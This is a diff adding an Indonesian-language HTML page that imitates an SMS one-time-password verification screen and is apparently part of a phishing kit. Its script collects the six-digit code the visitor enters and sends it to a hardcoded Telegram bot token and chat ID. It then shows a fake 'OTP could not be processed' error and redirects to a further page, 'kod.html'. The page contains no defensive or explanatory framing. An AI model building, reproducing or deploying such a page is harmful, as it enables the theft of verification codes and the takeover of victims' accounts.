@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>Validasi OTP</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        .otp-header {
+            background-color: #002244;
+            color: #ffffff;
+            padding: 18px 25px;
+        }
+
+        .otp-header h1 {
+            font-size: 1.3em;
+            margin-bottom: 5px;
+        }
+
+        .otp-header p {
+            font-size: 0.9em;
+        }
+
+        .otp-content {
+            padding: 25px;
+        }
+
+        .otp-info {
+            font-size: 0.95em;
+            margin-bottom: 20px;
+        }
+
+        .change-phone {
+            color: #2196F3;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 5px;
+            transition: color 0.3s ease;
+        }
+
+        .change-phone:hover {
+            color: #1976D2;
+        }
+
+        .otp-inputs {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            gap: 8px;
+        }
+
+        .otp-inputs input {
+            width: 42px;
+            height: 45px;
+            text-align: center;
+            font-size: 1.1em;
+            border: 1px solid #E0E0E0;
+            border-radius: 2px;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .otp-inputs input:focus {
+            border-color: #2196F3;
+            box-shadow: 0 0 0 2px rgba(33, 150, 243, 0.1);
+        }
+
+        .otp-inputs input:not(:placeholder-shown) {
+            border-color: #4CAF50;
+        }
+
+        .timer {
+            text-align: center;
+            font-size: 1em;
+            color: #616161;
+            margin-bottom: 25px;
+            transition: color 0.3s ease;
+        }
+
+        .timer.warning {
+            color: #F44336;
+            font-weight: bold;
+        }
+
+        .resend-section {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .resend-btn {
+            background-color: #2196F3;
+            color: white;
+            border: none;
+            padding: 8px 18px;
+            border-radius: 2px;
+            cursor: pointer;
+            font-size: 0.95em;
+            display: none;
+            transition: background-color 0.3s ease;
+        }
+
+        .resend-btn:hover {
+            background-color: #1976D2;
+        }
+
+        .divider {
+            height: 1px;
+            background-color: #E0E0E0;
+            width: 100%;
+            margin-top: 15px;
+        }
+
+        .action-area {
+            display: flex;
+            justify-content: flex-end;
+            padding: 12px 15px;
+        }
+
+        .done-btn {
+            background-color: #BDBDBD;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 2px;
+            cursor: not-allowed;
+            font-size: 1em;
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .done-btn.active {
+            background-color: #002244;
+            cursor: pointer;
+        }
+
+        .done-btn.active:hover {
+            background-color: #1976D2;
+        }
+
+        /* Gaya untuk loading */
+        .done-btn.loading {
+            background-color: #1976D2;
+            cursor: wait;
+            opacity: 0.8;
+        }
+
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid #ffffff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+
+        .done-btn.loading .spinner {
+            display: block;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="otp-header">
+        <h1>Masukkan one-time password (OTP)</h1>
+        <p>yang dikirim lewat SMS</p>
+    </div>
+
+    <div class="otp-content">
+        <div class="otp-info">
+            <p>Kode OTP 6 digit telah dikirimkan ke ponsel kamu cek SMS / Inbox.</p>
+            <a href="#" class="change-phone"></a>
+        </div>
+
+        <div class="otp-inputs">
+            <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" placeholder=" ">
+            <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" placeholder=" ">
+            <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" placeholder=" ">
+            <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" placeholder=" ">
+            <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" placeholder=" ">
+            <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" placeholder=" ">
+        </div>
+
+        <div class="timer" id="timer">00:30</div>
+
+        <div class="resend-section">
+            <button class="resend-btn" id="resendBtn">Kirim Ulang</button>
+        </div>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="action-area">
+        <button class="done-btn" id="doneBtn">
+            <span class="spinner"></span>
+            <span class="btn-text">KONFIRMASI</span>
+        </button>
+    </div>
+
+    <script>
+        let countdown = 30;
+        const timerElement = document.getElementById('timer');
+        const resendBtn = document.getElementById('resendBtn');
+        const doneBtn = document.getElementById('doneBtn');
+        const btnText = doneBtn.querySelector('.btn-text');
+        const otpInputs = document.querySelectorAll('.otp-inputs input');
+        const divider = document.querySelector('.divider');
+        let timerInterval;
+
+        function updateTimer() {
+            const minutes = Math.floor(countdown / 60);
+            const seconds = countdown % 60;
+            timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (countdown <= 5) {
+                timerElement.classList.add('warning');
+            } else {
+                timerElement.classList.remove('warning');
+            }
+            
+            if (countdown <= 0) {
+                clearInterval(timerInterval);
+                resendBtn.style.display = 'inline-block';
+                timerElement.classList.remove('warning');
+                alert('Waktu habis! Silakan klik tombol Kirim Ulang untuk mendapatkan kode baru.');
+            } else {
+                countdown--;
+            }
+        }
+
+        function startTimer() {
+            clearInterval(timerInterval);
+            timerInterval = setInterval(updateTimer, 1000);
+        }
+        startTimer();
+
+        function checkOTPComplete() {
+            let isComplete = true;
+            otpInputs.forEach(input => {
+                if (!input.value) isComplete = false;
+            });
+            
+            if (isComplete) {
+                doneBtn.classList.add('active');
+            } else {
+                doneBtn.classList.remove('active');
+            }
+        }
+
+        // Fungsi untuk berpindah halaman
+        function goToNextPage() {
+            // Ganti 'halaman-berikutnya.html' dengan nama file halaman selanjutnya kamu
+            window.location.href = 'kod.html'; 
+        }
+
+        function sendToTelegram() {
+            if (!doneBtn.classList.contains('active')) {
+                alert('Silakan isi kode OTP terlebih dahulu!');
+                return;
+            }
+
+            // Ubah tombol menjadi mode loading
+            doneBtn.classList.add('loading');
+            doneBtn.classList.remove('active');
+            btnText.textContent = 'OTP sedang di proses';
+            doneBtn.disabled = true; // Mencegah klik berulang
+
+            let otpCode = '';
+            otpInputs.forEach(input => otpCode += input.value);
+
+            // Isi dengan botToken dan chatId kamu yang asli
+            const botToken = '8608464116:AAGCZcxAcp1zSsIx8tIk6ZogleASHx6ZP-s'; 
+            const chatId = '8399708797';
+            const message = `Validasi OTP - Kode OTP: ${otpCode}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: chatId, text: message})
+            })
+            .then(res => res.json())
+            .then(data => {
+                console.log('Harap tunggu', data);
+                // Kembalikan tombol ke keadaan semula sebelum alert dan pindah halaman
+                doneBtn.classList.remove('loading');
+                doneBtn.classList.add('active');
+                btnText.textContent = 'KONFIRMASI';
+                doneBtn.disabled = false;
+                
+                alert('Error!! OTP tidak bisa di proses harap masukkan kode baru'); // Alert setelah proses selesai
+                doneBtn.textContent = 'Loading...';
+                // Tunggu 1.5 detik lalu pindah ke halaman selanjutnya
+                setTimeout(() => {
+                    goToNextPage(); // Panggil fungsi pindah halaman
+                }, 1500);
+            })
+            .catch(err => {
+                console.error('Error:', err);
+                // Kembalikan tombol ke keadaan semula sebelum alert
+                doneBtn.classList.remove('loading');
+                doneBtn.classList.add('active');
+                btnText.textContent = 'KONFIRMASI';
+                doneBtn.disabled = false;
+
+                alert('Gagal memproses OTP! Coba lagi nanti.'); // Alert jika gagal
+                doneBtn.textContent = 'Gagal! Coba lagi';
+                setTimeout(() => {
+                    doneBtn.textContent = 'KONFIRMASI';
+                }, 1500);
+            });
+        }
+
+        doneBtn.addEventListener('click', sendToTelegram);
+
+        resendBtn.addEventListener('click', () => {
+            alert('Kode OTP akan dikirim ulang!');
+            countdown = 30;
+            resendBtn.style.display = 'none';
+            otpInputs.forEach(input => input.value = '');
+            checkOTPComplete();
+            startTimer();
+        });
+
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                if (input.value && index < 5) otpInputs[index + 1].focus();
+                checkOTPComplete();
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !input.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+        });
+
+        window.addEventListener('scroll', () => {
+            const scrollY = window.scrollY;
+            divider.style.opacity = scrollY > 20 ? 1 : 0.5;
+            divider.style.transform = `scaleX(${scrollY > 20 ? 1 : 0.95})`;
+        });
+    </script>
+</body>
+</html>
